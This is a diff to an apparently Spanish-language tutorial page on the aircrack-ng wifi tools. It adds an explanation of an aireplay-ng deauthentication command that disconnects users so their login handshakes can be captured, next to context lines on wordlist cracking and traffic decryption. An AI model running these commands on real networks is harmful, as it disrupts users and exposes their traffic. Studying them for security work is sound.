@@ -243,6 +243,8 @@ aircrack-ng scan8-01.cap -w /root/rockyou-top100000.txt</pre>
                             <b>airodump-ng wlan0mon -c 6 --wps -w scan9:</b> Captura/Muestra el trafico de las redes
                             en el canal 6 y lo guarda en archivos llamados scan9.
                         </p>
+                        <p> <b>aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon:</b> Hace que se desconecte la gente para
+                            poder capturar los paquetes de login</p>
                         <p>
                             <b>airdecap-ng -e wifi-mobile -p starwars1 scan9-01.cap:</b> Captura y desencripta el
                             trafico wifi a la vez, utilizando la contraseña y ssid introducido (starwars1,
